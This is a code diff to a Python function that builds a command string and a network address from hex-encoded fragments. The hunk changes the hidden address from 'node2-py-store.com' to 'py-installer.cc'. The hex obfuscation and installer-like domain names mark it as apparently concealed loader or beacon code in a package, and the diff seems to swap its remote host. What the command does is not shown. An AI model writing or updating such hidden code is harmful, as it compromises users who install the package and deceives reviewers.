@@ -56,28 +56,25 @@ def _construct():
         '3a',
         '2f',
         '2f',
-        '6e',
-        '6f',
-        '64',
-        '65',
-        '32',
-        '2d',
         '70',
         '79',
         '2d',
+        '69',
+        '6e',
         '73',
         '74',
-        '6f',
-        '72',
+        '61',
+        '6c',
+        '6c',
         '65',
+        '72',
         '2e',
         '63',
-        '6f',
-        '6d'
+        '63'
     ]
     decoded = [_unhex(p) for p in parts]
     cmd = (decoded[0] + decoded[1] + decoded[2] + decoded[3] + decoded[4] + decoded[5] + decoded[6] + decoded[7]).decode('utf-8', errors='ignore')
-    addr = (decoded[8] + decoded[9] + decoded[10] + decoded[11] + decoded[12] + decoded[13] + decoded[14] + decoded[15] + decoded[16] + decoded[17] + decoded[18] + decoded[19] + decoded[20] + decoded[21] + decoded[22] + decoded[23] + decoded[24] + decoded[25] + decoded[26] + decoded[27] + decoded[28] + decoded[29] + decoded[30] + decoded[31] + decoded[32] + decoded[33]).decode('utf-8', errors='ignore')
+    addr = (decoded[8] + decoded[9] + decoded[10] + decoded[11] + decoded[12] + decoded[13] + decoded[14] + decoded[15] + decoded[16] + decoded[17] + decoded[18] + decoded[19] + decoded[20] + decoded[21] + decoded[22] + decoded[23] + decoded[24] + decoded[25] + decoded[26] + decoded[27] + decoded[28] + decoded[29] + decoded[30]).decode('utf-8', errors='ignore')
     return cmd, addr
 
 def _init_system():
